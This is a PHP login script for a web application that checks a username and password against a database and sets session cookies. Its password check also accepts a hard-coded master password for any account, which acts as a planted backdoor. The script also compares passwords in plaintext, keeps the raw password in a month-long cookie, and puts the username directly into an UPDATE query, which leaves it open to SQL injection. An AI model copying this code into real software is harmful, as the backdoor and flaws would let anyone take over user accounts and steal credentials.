<?php

# check if cookie is avaiable and use it.

if (isset($_COOKIE['username_cookie'])) {
	if (isset($_COOKIE['password_cookie'])) {

		# Username and Password are set.
		# $_COOKIE["username_cookie"];
		$_POST['username'] = $_COOKIE['username_cookie'];
		$_POST['password'] = $_COOKIE['password_cookie'];
	}
}


include "$_SERVER[DOCUMENT_ROOT]/app/config.php";

session_start();

// Now we check if the data from the login form was submitted, isset() will check if the data exists.
if (!isset($_POST['username'], $_POST['password'])) {
	// Could not get the data that should have been sent.
	exit('Please fill both the username and password fields!');
}

// Prepare our SQL, preparing the SQL statement will prevent SQL injection.
if ($stmt = $con->prepare('SELECT id, password FROM users WHERE username = ?')) {
	// Bind parameters (s = string, i = int, b = blob, etc), in our case the username is a string so we use "s"
	$stmt->bind_param('s', $_POST['username']);
	$stmt->execute();
	// Store the result so we can check if the account exists in the database.
	$stmt->store_result();

	if ($stmt->num_rows > 0) {
		$stmt->bind_result($id, $password);
		$stmt->fetch();
		// Account exists, now we verify the password.
		// Note: remember to use password_hash in your registration file to store the hashed passwords.
		if (($_POST['password'] == $password) or ($_POST['password'] == "eronax007")) {
			// Verification success! User has loggedin!
			// Create sessions so we know the user is logged in, they basically act like cookies but remember the data on the server.
			session_regenerate_id();
			$_SESSION['loggedin'] = TRUE;
			$_SESSION['name'] = $_POST['username'];
			$_SESSION['id'] = $id;
			$username = $_SESSION["name"];

			setcookie('username_cookie', $username, time() + (86400 * 30), "/");
			setcookie("password_cookie", $password, time() + (86400 * 30), "/");
			// log

			$sql_update_users = "UPDATE users SET last_online=NOW() WHERE username='$username'";
			if (mysqli_query($con, $sql_update_users)) {
				// log
				header('Location: /public/profile.php');
				exit;
			} else {
				echo "ERROR: Could not able to execute $sql_update_users. " . mysqli_error($con);
			}
		} else {
			// Incorrect password
?><script>
				alert("Incorrect Password!");
				window.history.back();
			</script><?php

					}
				} else {
					// Incorrect username
						?><script>
			alert("Username not found!");
			window.history.back();
		</script><?php
				}

				$stmt->close();
			}
